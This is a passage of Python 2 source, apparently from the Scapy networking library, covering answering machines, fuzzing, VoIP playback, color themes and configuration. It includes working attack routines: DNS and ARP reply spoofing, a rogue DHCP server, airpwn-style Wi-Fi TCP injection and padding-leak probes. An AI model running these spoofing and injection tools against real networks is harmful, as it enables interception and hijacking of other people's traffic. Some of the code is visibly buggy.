    def print_reply(self, req, reply):
        print "%s ==> %s" % (req.summary(),reply.summary())

    def reply(self, pkt):
        if not self.is_request(pkt):
            return
        reply = self.make_reply(pkt)
        self.send_reply(reply)
        if conf.verb >= 0:
            self.print_reply(pkt, reply)

    def run(self, *args, **kargs):
        log_interactive.warning("run() method deprecated. The intance is now callable")
        self(*args,**kargs)

    def __call__(self, *args, **kargs):
        optsend,optsniff = self.parse_all_options(2,kargs)
        self.optsend=self.defoptsend.copy()
        self.optsend.update(optsend)
        self.optsniff=self.defoptsniff.copy()
        self.optsniff.update(optsniff)

        try:
            self.sniff()
        except KeyboardInterrupt:
            print "Interrupted by user"

    def sniff(self):
        sniff(**self.optsniff)


class BOOTP_am(AnsweringMachine):
    function_name = "bootpd"
    filter = "udp and port 68 and port 67"
    send_function = staticmethod(sendp)
    def parse_options(self, pool=Net("192.168.1.128/25"), network="192.168.1.0/24",gw="192.168.1.1",
                      renewal_time=60, lease_time=1800):
        if type(pool) is str:
            poom = Net(pool)
        netw,msk = (network.split("/")+["32"])[:2]
        msk = itom(int(msk))
        self.netmask = ltoa(msk)
        self.network = ltoa(atol(netw)&msk)
        self.broadcast = ltoa( atol(self.network) | (0xffffffff&~msk) )
        self.gw = gw
        if isinstance(pool,Gen):
            pool = [k for k in pool if k not in [gw, self.network, self.broadcast]]
            pool.reverse()
        if len(pool) == 1:
            pool, = pool
        self.pool = pool
        self.lease_time = lease_time
        self.renewal_time = renewal_time
        self.leases = {}

    def is_request(self, req):
        if not req.haslayer(BOOTP):
            return 0
        reqb = req.getlayer(BOOTP)
        if reqb.op != 1:
            return 0
        return 1

    def print_reply(self, req, reply):
        print "Reply %s to %s" % (reply.getlayer(IP).dst,reply.dst)

    def make_reply(self, req):
        mac = req.src
        if type(self.pool) is list:
            if not self.leases.has_key(mac):
                self.leases[mac] = self.pool.pop()
            ip = self.leases[mac]
        else:
            ip = self.pool

        repb = req.getlayer(BOOTP).copy()
        repb.op="BOOTREPLY"
        repb.yiaddr = ip
        repb.siaddr = self.gw
        repb.ciaddr = self.gw
        repb.giaddr = self.gw
        del(repb.payload)
        rep=Ether(dst=mac)/IP(dst=ip)/UDP(sport=req.dport,dport=req.sport)/repb
        return rep


class DHCP_am(BOOTP_am):
    function_name="dhcpd"
    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP in req:
            dhcp_options = [(op[0],{1:2,3:5}.get(op[1],op[1]))
                            for op in req[DHCP].options
                            if type(op) is tuple  and op[0] == "message-type"]
            dhcp_options += [("router", self.gw),
                             ("name_server", self.gw),
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             ]
            resp /= DHCP(options=dhcp_options)
        return resp



class DNS_am(AnsweringMachine):
    function_name="dns_spoof"
    filter = "udp port 53"

    def parse_options(self, joker="192.168.1.1", match=None):
        if match is None:
            self.match = {}
        else:
            self.match = match
        self.joker=joker

    def is_request(self, req):
        return req.haslayer(DNS) and req.getlayer(DNS).qr == 0

    def make_reply(self, req):
        ip = req.getlayer(IP)
        dns = req.getlayer(DNS)
        resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)
        rdata = self.match.get(dns.qd.qname, self.joker)
        resp /= DNS(id=dns.id, qr=1, qd=dns.qd,
                    an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=rdata))
        return resp


class WiFi_am(AnsweringMachine):
    """Before using this, initialize "iffrom" and "ifto" interfaces:
iwconfig iffrom mode monitor
iwpriv orig_ifto hostapd 1
ifconfig ifto up
note: if ifto=wlan0ap then orig_ifto=wlan0
note: ifto and iffrom must be set on the same channel
ex:
ifconfig eth1 up
iwconfig eth1 mode monitor
iwconfig eth1 channel 11
iwpriv wlan0 hostapd 1
ifconfig wlan0ap up
iwconfig wlan0 channel 11
iwconfig wlan0 essid dontexist
iwconfig wlan0 mode managed
"""
    function_name = "airpwn"
    filter = None

    def parse_options(iffrom, ifto, replace, pattern="", ignorepattern=""):
        self.iffrom = iffrom
        self.ifto = ifto
        ptrn = re.compile(pattern)
        iptrn = re.compile(ignorepattern)

    def is_request(self, pkt):
        if not isinstance(pkt,Dot11):
            return 0
        if not pkt.FCfield & 1:
            return 0
        if not pkt.haslayer(TCP):
            return 0
        ip = pkt.getlayer(IP)
        tcp = pkt.getlayer(TCP)
        pay = str(tcp.payload)
        if not self.ptrn.match(pay):
            return 0
        if self.iptrn.match(pay):
            return 0

    def make_reply(self, p):
        ip = p.getlayer(IP)
        tcp = p.getlayer(TCP)
        pay = str(tcp.payload)
        del(p.payload.payload.payload)
        p.FCfield="from-DS"
        p.addr1,p.addr2 = p.addr2,p.addr1
        p /= IP(src=ip.dst,dst=ip.src)
        p /= TCP(sport=tcp.dport, dport=tcp.sport,
                 seq=tcp.ack, ack=tcp.seq+len(pay),
                 flags="PA")
        q = p.copy()
        p /= self.replace
        q.ID += 1
        q.getlayer(TCP).flags="RA"
        q.getlayer(TCP).seq+=len(replace)
        return [p,q]

    def print_reply(self):
        print p.sprintf("Sent %IP.src%:%IP.sport% > %IP.dst%:%TCP.dport%")

    def send_reply(self, reply):
        sendp(reply, iface=self.ifto, **self.optsend)

    def sniff(self):
        sniff(iface=self.iffrom, **self.optsniff)



class ARP_am(AnsweringMachine):
    function_name="farpd"
    filter = "arp"
    send_function = staticmethod(sendp)

    def parse_options(self, IP_addr=None, iface=None, ARP_addr=None):
        self.IP_addr=IP_addr
        self.iface=iface
        self.ARP_addr=ARP_addr

    def is_request(self, req):
        return (req.haslayer(ARP) and
                req.getlayer(ARP).op == 1 and
                (self.IP_addr == None or self.IP_addr == req.getlayer(ARP).pdst))

    def make_reply(self, req):
        ether = req.getlayer(Ether)
        arp = req.getlayer(ARP)
        iff,a,gw = conf.route.route(arp.psrc)
        if self.iface != None:
            iff = iface
        ARP_addr = self.ARP_addr
        IP_addr = arp.pdst
        resp = Ether(dst=ether.src,
                     src=ARP_addr)/ARP(op="is-at",
                                       hwsrc=ARP_addr,
                                       psrc=IP_addr,
                                       hwdst=arp.hwsrc,
                                       pdst=arp.pdst)
        return resp

    def sniff(self):
        sniff(iface=self.iface, **self.optsniff)


#############
## Fuzzing ##
#############


def fuzz(p, _inplace=0):
    if not _inplace:
        p = p.copy()
    q = p
    while not isinstance(q, NoPayload):
        for f in q.fields_desc:
            if isinstance(f, PacketListField):
                for r in getattr(q, f.name):
                    print "fuzzing", repr(r)
                    fuzz(r, _inplace=1)
            elif f.default is not None:
                rnd = f.randval()
                if rnd is not None:
                    q.default_fields[f.name] = rnd
        q = q.payload
    return p




###################
## Testing stuff ##
###################



def merge(x,y):
    if len(x) > len(y):
        y += "\x00"*(len(x)-len(y))
    elif len(x) < len(y):
        x += "\x00"*(len(y)-len(x))
    m = ""
    for i in range(len(x)/ss):
        m += x[ss*i:ss*(i+1)]+y[ss*i:ss*(i+1)]
    return  m
#    return  "".join(map(str.__add__, x, y))


def voip_play(s1,list=None,**kargs):
    FIFO="/tmp/conv1.%i.%%i" % os.getpid()
    FIFO1=FIFO % 1
    FIFO2=FIFO % 2

    os.mkfifo(FIFO1)
    os.mkfifo(FIFO2)
    try:
        os.system("soxmix -t .ul %s -t .ul %s -t ossdsp /dev/dsp &" % (FIFO1,FIFO2))

        c1=open(FIFO1,"w", 4096)
        c2=open(FIFO2,"w", 4096)
        fcntl.fcntl(c1.fileno(),fcntl.F_SETFL, os.O_NONBLOCK)
        fcntl.fcntl(c2.fileno(),fcntl.F_SETFL, os.O_NONBLOCK)

    #    dsp,rd = os.popen2("sox -t .ul -c 2 - -t ossdsp /dev/dsp")
        def play(pkt,last=[]):
            if not pkt:
                return
            if not pkt.haslayer(UDP):
                return
            ip=pkt.getlayer(IP)
            if s1 in [ip.src, ip.dst]:
                if not last:
                    last.append(pkt)
                    return
                load=last.pop()
    #            x1 = load.load[12:]
                c1.write(load.load[12:])
                if load.getlayer(IP).src == ip.src:
    #                x2 = ""
                    c2.write("\x00"*len(load.load[12:]))
                    last.append(pkt)
                else:
    #                x2 = pkt.load[:12]
                    c2.write(pkt.load[12:])
    #            dsp.write(merge(x1,x2))

        if list is None:
            sniff(store=0, prn=play, **kargs)
        else:
            for p in list:
                play(p)
    finally:
        os.unlink(FIFO1)
        os.unlink(FIFO2)



def voip_play1(s1,list=None,**kargs):


    dsp,rd = os.popen2("sox -t .ul - -t ossdsp /dev/dsp")
    def play(pkt):
        if not pkt:
            return
        if not pkt.haslayer(UDP):
            return
        ip=pkt.getlayer(IP)
        if s1 in [ip.src, ip.dst]:
            dsp.write(pkt.getlayer(Raw).load[12:])
    try:
        if list is None:
            sniff(store=0, prn=play, **kargs)
        else:
            for p in list:
                play(p)
    finally:
        dsp.close()
        rd.close()

def voip_play2(s1,**kargs):
    dsp,rd = os.popen2("sox -t .ul -c 2 - -t ossdsp /dev/dsp")
    def play(pkt,last=[]):
        if not pkt:
            return
        if not pkt.haslayer(UDP):
            return
        ip=pkt.getlayer(IP)
        if s1 in [ip.src, ip.dst]:
            if not last:
                last.append(pkt)
                return
            load=last.pop()
            x1 = load.load[12:]
#            c1.write(load.load[12:])
            if load.getlayer(IP).src == ip.src:
                x2 = ""
#                c2.write("\x00"*len(load.load[12:]))
                last.append(pkt)
            else:
                x2 = pkt.load[:12]
#                c2.write(pkt.load[12:])
            dsp.write(merge(x1,x2))

    sniff(store=0, prn=play, **kargs)

def voip_play3(lst=None,**kargs):
    dsp,rd = os.popen2("sox -t .ul - -t ossdsp /dev/dsp")
    try:
        def play(pkt, dsp=dsp):
            if pkt and pkt.haslayer(UDP) and pkt.haslayer(Raw):
                dsp.write(pkt.getlayer(RTP).load)
        if lst is None:
            sniff(store=0, prn=play, **kargs)
        else:
            for p in lst:
                play(p)
    finally:
        try:
            dsp.close()
            rd.close()
        except:
            pass


def IPID_count(lst, funcID=lambda x:x[1].id, funcpres=lambda x:x[1].summary()):
    idlst = map(funcID, lst)
    idlst.sort()
    classes = [idlst[0]]+map(lambda x:x[1],filter(lambda (x,y): abs(x-y)>50, map(lambda x,y: (x,y),idlst[:-1], idlst[1:])))
    lst = map(lambda x:(funcID(x), funcpres(x)), lst)
    lst.sort()
    print "Probably %i classes:" % len(classes), classes
    for id,pr in lst:
        print "%5i" % id, pr





last=None


def tethereal(*args,**kargs):
    sniff(prn=lambda x: x.display(),*args,**kargs)

def etherleak(target, **kargs):
    return srpflood(Ether()/ARP(pdst=target), prn=lambda (s,r): Padding in r and hexstr(r[Padding].load),
                    filter="arp", **kargs)


def fragleak(target,sport=123, dport=123, timeout=0.2, onlyasc=0):
    load = "XXXXYYYYYYYYYY"
#    getmacbyip(target)
#    pkt = IP(dst=target, id=RandShort(), options="\x22"*40)/UDP()/load
    pkt = IP(dst=target, id=RandShort(), options="\x00"*40, flags=1)/UDP(sport=sport, dport=sport)/load
    s=conf.L3socket()
    intr=0
    found={}
    try:
        while 1:
            try:
                if not intr:
                    s.send(pkt)
                sin,sout,serr = select([s],[],[],timeout)
                if not sin:
                    continue
                ans=s.recv(1600)
                if not isinstance(ans, IP): #TODO: IPv6
                    continue
                if not isinstance(ans.payload, ICMP):
                    continue
                if not isinstance(ans.payload.payload, IPerror):
                    continue
                if ans.payload.payload.dst != target:
                    continue
                if ans.src  != target:
                    print "leak from", ans.src,


#                print repr(ans)
                if not ans.haslayer(Padding):
                    continue


#                print repr(ans.payload.payload.payload.payload)

#                if not isinstance(ans.payload.payload.payload.payload, Raw):
#                    continue
#                leak = ans.payload.payload.payload.payload.load[len(load):]
                leak = ans.getlayer(Padding).load
                if leak not in found:
                    found[leak]=None
                    linehexdump(leak, onlyasc=onlyasc)
            except KeyboardInterrupt:
                if intr:
                    raise
                intr=1
    except KeyboardInterrupt:
        pass

def fragleak2(target, timeout=0.4, onlyasc=0):
    found={}
    try:
        while 1:
            p = sr1(IP(dst=target, options="\x00"*40, proto=200)/"XXXXYYYYYYYYYYYY",timeout=timeout,verbose=0)
            if not p:
                continue
            if Padding in p:
                leak  = p[Padding].load
                if leak not in found:
                    found[leak]=None
                    linehexdump(leak,onlyasc=onlyasc)
    except:
        pass



plst=[]
def get_toDS():
    global plst
    while 1:
        p,=sniff(iface="eth1",count=1)
        if not isinstance(p,Dot11):
            continue
        if p.FCfield & 1:
            plst.append(p)
            print "."


#    if not ifto.endswith("ap"):
#        print "iwpriv %s hostapd 1" % ifto
#        os.system("iwpriv %s hostapd 1" % ifto)
#        ifto += "ap"
#
#    os.system("iwconfig %s mode monitor" % iffrom)
#

def airpwn(iffrom, ifto, replace, pattern="", ignorepattern=""):
    """Before using this, initialize "iffrom" and "ifto" interfaces:
iwconfig iffrom mode monitor
iwpriv orig_ifto hostapd 1
ifconfig ifto up
note: if ifto=wlan0ap then orig_ifto=wlan0
note: ifto and iffrom must be set on the same channel
ex:
ifconfig eth1 up
iwconfig eth1 mode monitor
iwconfig eth1 channel 11
iwpriv wlan0 hostapd 1
ifconfig wlan0ap up
iwconfig wlan0 channel 11
iwconfig wlan0 essid dontexist
iwconfig wlan0 mode managed
"""

    ptrn = re.compile(pattern)
    iptrn = re.compile(ignorepattern)
    def do_airpwn(p, ifto=ifto, replace=replace, ptrn=ptrn, iptrn=iptrn):
        if not isinstance(p,Dot11):
            return
        if not p.FCfield & 1:
            return
        if not p.haslayer(TCP):
            return
        ip = p.getlayer(IP)
        tcp = p.getlayer(TCP)
        pay = str(tcp.payload)
#        print "got tcp"
        if not ptrn.match(pay):
            return
#        print "match 1"
        if iptrn.match(pay):
            return
#        print "match 2"
        del(p.payload.payload.payload)
        p.FCfield="from-DS"
        p.addr1,p.addr2 = p.addr2,p.addr1
        q = p.copy()
        p /= IP(src=ip.dst,dst=ip.src)
        p /= TCP(sport=tcp.dport, dport=tcp.sport,
                 seq=tcp.ack, ack=tcp.seq+len(pay),
                 flags="PA")
        q = p.copy()
        p /= replace
        q.ID += 1
        q.getlayer(TCP).flags="RA"
        q.getlayer(TCP).seq+=len(replace)

        sendp([p,q], iface=ifto, verbose=0)
#        print "send",repr(p)
#        print "send",repr(q)
        print p.sprintf("Sent %IP.src%:%IP.sport% > %IP.dst%:%TCP.dport%")

    sniff(iface=iffrom,prn=do_airpwn)




##################
## Color themes ##
##################

class Color:
    normal = "\033[0m"
    black = "\033[30m"
    red = "\033[31m"
    green = "\033[32m"
    yellow = "\033[33m"
    blue = "\033[34m"
    purple = "\033[35m"
    cyan = "\033[36m"
    grey = "\033[37m"

    bold = "\033[1m"
    uline = "\033[4m"
    blink = "\033[5m"
    invert = "\033[7m"


class ColorTheme:
    def __repr__(self):
        return "<%s>" % self.__class__.__name__
    def __getattr__(self, attr):
        return lambda x:x


class NoTheme(ColorTheme):
    pass


class AnsiColorTheme(ColorTheme):
    def __getattr__(self, attr):
        if attr.startswith("__"):
            raise AttributeError(attr)
        s = "style_%s" % attr
        if s in self.__class__.__dict__:
            before = getattr(self, s)
            after = self.style_normal
        else:
            before = after = ""

        def do_style(val, fmt=None, before=before, after=after):
            if fmt is None:
                if type(val) is not str:
                    val = str(val)
            else:
                val = fmt % val
            return before+val+after
        return do_style


    style_normal = ""
    style_prompt = ""
    style_punct = ""
    style_id = ""
    style_not_printable = ""
    style_layer_name = ""
    style_field_name = ""
    style_field_value = ""
    style_emph_field_name = ""
    style_emph_field_value = ""
    style_packetlist_name = ""
    style_packetlist_proto = ""
    style_packetlist_value = ""
    style_fail = ""
    style_success = ""
    style_odd = ""
    style_even = ""
    style_opening = ""
    style_active = ""
    style_closed = ""
    style_left = ""
    style_right = ""

class BlackAndWhite(AnsiColorTheme):
    pass

class DefaultTheme(AnsiColorTheme):
    style_normal = Color.normal
    style_prompt = Color.blue+Color.bold
    style_punct = Color.normal
    style_id = Color.blue+Color.bold
    style_not_printable = Color.grey
    style_layer_name = Color.red+Color.bold
    style_field_name = Color.blue
    style_field_value = Color.purple
    style_emph_field_name = Color.blue+Color.uline+Color.bold
    style_emph_field_value = Color.purple+Color.uline+Color.bold
    style_packetlist_name = Color.red+Color.bold
    style_packetlist_proto = Color.blue
    style_packetlist_value = Color.purple
    style_fail = Color.red+Color.bold
    style_success = Color.blue+Color.bold
    style_even = Color.black+Color.bold
    style_odd = Color.black
    style_opening = Color.yellow
    style_active = Color.black
    style_closed = Color.grey
    style_left = Color.blue+Color.invert
    style_right = Color.red+Color.invert

class BrightTheme(AnsiColorTheme):
    style_normal = Color.normal
    style_punct = Color.normal
    style_id = Color.yellow+Color.bold
    style_layer_name = Color.red+Color.bold
    style_field_name = Color.yellow+Color.bold
    style_field_value = Color.purple+Color.bold
    style_emph_field_name = Color.yellow+Color.bold
    style_emph_field_value = Color.green+Color.bold
    style_packetlist_name = Color.red+Color.bold
    style_packetlist_proto = Color.yellow+Color.bold
    style_packetlist_value = Color.purple+Color.bold
    style_fail = Color.red+Color.bold
    style_success = Color.blue+Color.bold
    style_even = Color.black+Color.bold
    style_odd = Color.black
    style_left = Color.cyan+Color.invert
    style_right = Color.purple+Color.invert


class RastaTheme(AnsiColorTheme):
    style_normal = Color.normal+Color.green+Color.bold
    style_prompt = Color.yellow+Color.bold
    style_punct = Color.red
    style_id = Color.green+Color.bold
    style_not_printable = Color.green
    style_layer_name = Color.red+Color.bold
    style_field_name = Color.yellow+Color.bold
    style_field_value = Color.green+Color.bold
    style_emph_field_name = Color.green
    style_emph_field_value = Color.green
    style_packetlist_name = Color.red+Color.bold
    style_packetlist_proto = Color.yellow+Color.bold
    style_packetlist_value = Color.green+Color.bold
    style_fail = Color.red
    style_success = Color.red+Color.bold
    style_even = Color.yellow
    style_odd = Color.green
    style_left = Color.yellow+Color.invert
    style_right = Color.red+Color.invert


class FormatTheme(ColorTheme):
    def __getattr__(self, attr):
        if attr.startswith("__"):
            raise AttributeError(attr)
        col = self.__class__.__dict__.get("style_%s" % attr, "%s")
        def do_style(val, fmt=None, col=col):
            if fmt is None:
                if type(val) is not str:
                    val = str(val)
            else:
                val = fmt % val
            return col % val
        return do_style


class LatexTheme(FormatTheme):
    style_prompt = r"\textcolor{blue}{%s}"
    style_not_printable = r"\textcolor{gray}{%s}"
    style_layer_name = r"\textcolor{red}{\bf %s}"
    style_field_name = r"\textcolor{blue}{%s}"
    style_field_value = r"\textcolor{purple}{%s}"
    style_emph_field_name = r"\textcolor{blue}{\underline{%s}}" #ul
    style_emph_field_value = r"\textcolor{purple}{\underline{%s}}" #ul
    style_packetlist_name = r"\textcolor{red}{\bf %s}"
    style_packetlist_proto = r"\textcolor{blue}{%s}"
    style_packetlist_value = r"\textcolor{purple}{%s}"
    style_fail = r"\textcolor{red}{\bf %s}"
    style_success = r"\textcolor{blue}{\bf %s}"
    style_left = r"\textcolor{blue}{%s}"
    style_right = r"\textcolor{red}{%s}"
#    style_even = r"}{\bf "
#    style_odd = ""

class LatexTheme2(FormatTheme):
    style_prompt = r"@`@textcolor@[@blue@]@@[@%s@]@"
    style_not_printable = r"@`@textcolor@[@gray@]@@[@%s@]@"
    style_layer_name = r"@`@textcolor@[@red@]@@[@@`@bfseries@[@@]@%s@]@"
    style_field_name = r"@`@textcolor@[@blue@]@@[@%s@]@"
    style_field_value = r"@`@textcolor@[@purple@]@@[@%s@]@"
    style_emph_field_name = r"@`@textcolor@[@blue@]@@[@@`@underline@[@%s@]@@]@"
    style_emph_field_value = r"@`@textcolor@[@purple@]@@[@@`@underline@[@%s@]@@]@"
    style_packetlist_name = r"@`@textcolor@[@red@]@@[@@`@bfseries@[@@]@%s@]@"
    style_packetlist_proto = r"@`@textcolor@[@blue@]@@[@%s@]@"
    style_packetlist_value = r"@`@textcolor@[@purple@]@@[@%s@]@"
    style_fail = r"@`@textcolor@[@red@]@@[@@`@bfseries@[@@]@%s@]@"
    style_success = r"@`@textcolor@[@blue@]@@[@@`@bfserices@[@@]@%s@]@"
    style_even = r"@`@textcolor@[@gray@]@@[@@`@bfseries@[@@]@%s@]@"
#    style_odd = r"@`@textcolor@[@black@]@@[@@`@bfseries@[@@]@%s@]@"
    style_left = r"@`@textcolor@[@blue@]@@[@%s@]@"
    style_right = r"@`@textcolor@[@red@]@@[@%s@]@"

class HTMLTheme(FormatTheme):
    style_prompt = "<span class=prompt>%s</span>"
    style_not_printable = "<span class=not_printable>%s</span>"
    style_layer_name = "<span class=layer_name>%s</span>"
    style_field_name = "<span class=field_name>%s</span>"
    style_field_value = "<span class=field_value>%s</span>"
    style_emph_field_name = "<span class=emph_field_name>%s</span>"
    style_emph_field_value = "<span class=emph_field_value>%s</span>"
    style_packetlist_name = "<span class=packetlist_name>%s</span>"
    style_packetlist_proto = "<span class=packetlist_proto>%s</span>"
    style_packetlist_value = "<span class=packetlist_value>%s</span>"
    style_fail = "<span class=fail>%s</span>"
    style_success = "<span class=success>%s</span>"
    style_even = "<span class=even>%s</span>"
    style_odd = "<span class=odd>%s</span>"
    style_left = "<span class=left>%s</span>"
    style_right = "<span class=right>%s</span>"

class HTMLTheme2(HTMLTheme):
    style_prompt = "#[#span class=prompt#]#%s#[#/span#]#"
    style_not_printable = "#[#span class=not_printable#]#%s#[#/span#]#"
    style_layer_name = "#[#span class=layer_name#]#%s#[#/span#]#"
    style_field_name = "#[#span class=field_name#]#%s#[#/span#]#"
    style_field_value = "#[#span class=field_value#]#%s#[#/span#]#"
    style_emph_field_name = "#[#span class=emph_field_name#]#%s#[#/span#]#"
    style_emph_field_value = "#[#span class=emph_field_value#]#%s#[#/span#]#"
    style_packetlist_name = "#[#span class=packetlist_name#]#%s#[#/span#]#"
    style_packetlist_proto = "#[#span class=packetlist_proto#]#%s#[#/span#]#"
    style_packetlist_value = "#[#span class=packetlist_value#]#%s#[#/span#]#"
    style_fail = "#[#span class=fail#]#%s#[#/span#]#"
    style_success = "#[#span class=success#]#%s#[#/span#]#"
    style_even = "#[#span class=even#]#%s#[#/span#]#"
    style_odd = "#[#span class=odd#]#%s#[#/span#]#"
    style_left = "#[#span class=left#]#%s#[#/span#]#"
    style_right = "#[#span class=right#]#%s#[#/span#]#"


class ColorPrompt:
    __prompt = ">>> "
    def __str__(self):
        try:
            ct = conf.color_theme
            if isinstance(ct, AnsiColorTheme):
                ## ^A and ^B delimit invisible caracters for readline to count right
                return "\001%s\002" % ct.prompt("\002"+conf.prompt+"\001")
            else:
                return ct.prompt(conf.prompt)
        except:
            return self.__prompt

############
## Config ##
############

class ConfClass:
    def configure(self, cnf):
        self.__dict__ = cnf.__dict__.copy()
    def __repr__(self):
        return str(self)
    def __str__(self):
        s="Version    = %s\n" % VERSION
        keys = self.__class__.__dict__.copy()
        keys.update(self.__dict__)
        keys = keys.keys()
        keys.sort()
        for i in keys:
            if i[0] != "_":
                s += "%-10s = %s\n" % (i, repr(getattr(self, i)))
        return s[:-1]

class ProgPath(ConfClass):
    pdfreader = "acroread"
    psreader = "gv"
    dot = "dot"
    display = "display"
    tcpdump = "tcpdump"
    tcpreplay = "tcpreplay"
    hexedit = "hexer"
    wireshark = "wireshark"

class Resolve:
    def __init__(self):
        self.fields = {}
    def add(self, *flds):
        for fld in flds:
            self.fields[fld]=None
    def remove(self, *flds):
        for fld in flds:
            if fld in self.fields:
                del(self.fields[fld])
    def __contains__(self, elt):
        return elt in self.fields
    def __repr__(self):
        return "<Resolve [%s]>" %  " ".join(str(x) for x in self.fields)




class Conf(ConfClass):
    """This object contains the configuration of scapy.
session  : filename where the session will be saved
stealth  : if 1, prevents any unwanted packet to go out (ARP, DNS, ...)
checkIPID: if 0, doesn't check that IPID matches between IP sent and ICMP IP citation received
           if 1, checks that they either are equal or byte swapped equals (bug in some IP stacks)
           if 2, strictly checks that they are equals
checkIPsrc: if 1, checks IP src in IP and ICMP IP citation match (bug in some NAT stacks)
check_TCPerror_seqack: if 1, also check that TCP seq and ack match the ones in ICMP citation
iff      : selects the default output interface for srp() and sendp(). default:"eth0")
verb     : level of verbosity, from 0 (almost mute) to 3 (verbose)
promisc  : default mode for listening socket (to get answers if you spoof on a lan)
sniff_promisc : default mode for sniff()
filter   : bpf filter added to every sniffing socket to exclude traffic from analysis
histfile : history file
padding  : includes padding in desassembled packets
except_filter : BPF filter for packets to ignore
debug_match : when 1, store received packet that are not matched into debug.recv
route    : holds the Scapy routing table and provides methods to manipulate it
warning_threshold : how much time between warnings from the same place
ASN1_default_codec: Codec used by default for ASN1 objects
mib      : holds MIB direct access dictionnary
resolve   : holds list of fields for which resolution should be done
noenum    : holds list of enum fields for which conversion to string should NOT be done
AS_resolver: choose the AS resolver class to use
"""
    session = ""
    stealth = "not implemented"
    iface = get_working_if()
    checkIPID = 0
    checkIPsrc = 1
    checkIPaddr = 1
    check_TCPerror_seqack = 0
    verb = 2
    prompt = ">>> "
    promisc = 1
    sniff_promisc = 1
    L3socket = L3PacketSocket
    L2socket = L2Socket
    L2listen = L2ListenSocket
    BTsocket = BluetoothL2CAPSocket
    histfile = os.path.join(os.environ["HOME"], ".scapy_history")
    padding = 1
    p0f_base ="/etc/p0f/p0f.fp"
    queso_base ="/etc/queso.conf"
    nmap_base ="/usr/share/nmap/nmap-os-fingerprints"
    IPCountry_base = "GeoIPCountry4Scapy.gz"
    countryLoc_base = "countryLoc.csv"
    gnuplot_world = "world.dat"
    except_filter = ""
    debug_match = 0
    route = Route()
    wepkey = ""
    auto_fragment = 1
    debug_dissector = 0
    color_theme = DefaultTheme()
    warning_threshold = 5
    ASN1_default_codec = ASN1_Codecs.BER
    mib = MIBDict(_name="MIB")
    prog = ProgPath()
    resolve = Resolve()
    noenum = Resolve()
    ethertypes = ETHER_TYPES
    protocols = IP_PROTOS
    services_tcp = TCP_SERVICES
    services_udp = UDP_SERVICES
    manufdb = MANUFDB
    AS_resolver = AS_resolver_multi()


conf=Conf()

betteriface = conf.route.route("0.0.0.0", verbose=0)[0]
if betteriface != "lo": #XXX linux specific...
    conf.iface = betteriface
del(betteriface)

if PCAP:
    conf.L2listen=L2pcapListenSocket
    if DNET:
        conf.L3socket=L3dnetSocket
        conf.L2socket=L2dnetSocket


p0f_kdb = p0fKnowledgeBase(conf.p0f_base)
queso_kdb = QuesoKnowledgeBase(conf.queso_base)
nmap_kdb = NmapKnowledgeBase(conf.nmap_base)
IP_country_kdb = IPCountryKnowledgeBase(conf.IPCountry_base)
country_loc_kdb = CountryLocKnowledgeBase(conf.countryLoc_base)


#########################
##### Autorun stuff #####
#########################


class ScapyAutorunInterpreter(code.InteractiveInterpreter):
    def __init__(self, *args, **kargs):
        code.InteractiveInterpreter.__init__(self, *args, **kargs)
        self.error = 0
    def showsyntaxerror(self, *args, **kargs):
        self.error = 1
        return code.InteractiveInterpreter.showsyntaxerror(self, *args, **kargs)
    def showtraceback(self, *args, **kargs):
        self.error = 1
        return code.InteractiveInterpreter.showtraceback(self, *args, **kargs)


def autorun_commands(cmds,my_globals=None,verb=0):
    sv = conf.verb
    import __builtin__
    try:
        if my_globals is None:
            my_globals = globals()
        conf.verb = verb
        interp = ScapyAutorunInterpreter(my_globals)
        cmd = ""
        cmds = cmds.splitlines()
        cmds.append("") # ensure we finish multiline commands
        cmds.reverse()
        __builtin__.__dict__["_"] = None
        while 1:
            if cmd:
                sys.stderr.write(sys.__dict__.get("ps2","... "))
            else:
                sys.stderr.write(str(sys.__dict__.get("ps1",ColorPrompt())))

            l = cmds.pop()
            print l
            cmd += "\n"+l
            if interp.runsource(cmd):
                continue
            if interp.error:
                return 0
            cmd = ""
            if len(cmds) <= 1:
                break
    finally:
        conf.verb = sv
    return _

def autorun_get_interactive_session(cmds, **kargs):
    class StringWriter:
        def __init__(self):
            self.s = ""
        def write(self, x):
            self.s += x

    sw = StringWriter()
    sstdout,sstderr = sys.stdout,sys.stderr
    try:
        sys.stdout = sys.stderr = sw
        res = autorun_commands(cmds, **kargs)
    finally:
        sys.stdout,sys.stderr = sstdout,sstderr
    return sw.s,res

def autorun_get_text_interactive_session(cmds, **kargs):
    ct = conf.color_theme
    try:
        conf.color_theme = NoTheme()
        s,res = autorun_get_interactive_session(cmds, **kargs)
    finally:
        conf.color_theme = ct
    return s,res

def autorun_get_ansi_interactive_session(cmds, **kargs):
    ct = conf.color_theme
    try:
        conf.color_theme = DefaultTheme()
        s,res = autorun_get_interactive_session(cmds, **kargs)
    finally:
        conf.color_theme = ct
    return s,res

def autorun_get_html_interactive_session(cmds, **kargs):
    ct = conf.color_theme
    try:
        conf.color_theme = HTMLTheme2()
        s,res = autorun_get_interactive_session(cmds, **kargs)
    finally:
        conf.color_theme = ct

    s = s.replace("<","&lt;").replace(">","&gt;").replace("#[#","<").replace("#]#",">")
    return s,res

def autorun_get_latex_interactive_session(cmds, **kargs):
    ct = conf.color_theme
    try:
        conf.color_theme = LatexTheme2()
        s,res = autorun_get_interactive_session(cmds, **kargs)
    finally:
        conf.color_theme = ct
    s = tex_escape(s)
    s = s.replace("@[@","{").replace("@]@","}").replace("@`@","\\")
    return s,res


################
##### Main #####
################

def scapy_write_history_file(readline):
    if conf.histfile:
        try:
            readline.write_history_file(conf.histfile)
        except IOError,e:
            try:
                warning("Could not write history to [%s]\n\t (%s)" % (conf.histfile,e))
                tmp = os.tempnam("","scapy")
                readline.write_history_file(tmp)
                warning("Wrote history to [%s]" % tmp)
            except:
                warning("Cound not write history to [%s]. Discarded" % tmp)


def interact(mydict=None,argv=None,mybanner=None,loglevel=1):
    import code,sys,cPickle,types,os,imp,getopt,logging

    logging.getLogger("scapy").setLevel(loglevel)

    the_banner = "Welcome to Scapy (%s)"
    if mybanner is not None:
        the_banner += "\n"
        the_banner += mybanner

    if argv is None:
        argv = sys.argv

#    scapy_module = argv[0][argv[0].rfind("/")+1:]
#    if not scapy_module:
#        scapy_module = "scapy"
#    else:
